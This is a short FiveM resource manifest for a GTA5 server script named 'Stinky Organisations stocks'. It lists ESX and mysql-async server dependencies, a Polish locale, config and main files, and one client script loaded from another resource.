fx_version "bodacious"
games {"gta5"}
lua54 'yes'
author 'Stinky#1937'
description 'Stinky Organisations stocks'

server_scripts {
	'@es_extended/locale.lua',
	'@mysql-async/lib/MySQL.lua',
	'locales/pl.lua',
	'config.lua',
	'server/main.lua'
}


client_script '@pozdoodtajczyka/client/main.lua'